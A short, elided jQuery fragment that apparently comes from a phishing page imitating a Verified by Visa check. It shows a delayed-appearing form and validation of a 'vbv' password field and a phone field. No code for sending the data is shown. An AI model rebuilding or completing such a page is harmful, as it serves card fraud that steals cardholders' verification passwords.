$(function() {
	...
	$("#xGhostRiderForm").delay(1000).fadeIn(300);
		$("#vbv_submit_btn").click(function(o) {
			...
			$("#phone").keydown(function() {$(this).css("border-color", "#a9a9a9")});
		    ...
		    if (0 == /.{3,}/.test($("#password_vbv").val())) $("#password_vbv").css("border-color", ""), !1;
			...
			if (0 == /[0-9]{1,}/.test($("#phone").val())) return $("#phone").focus(), $("#phone").css("border-color", "#bf0000"), !1;
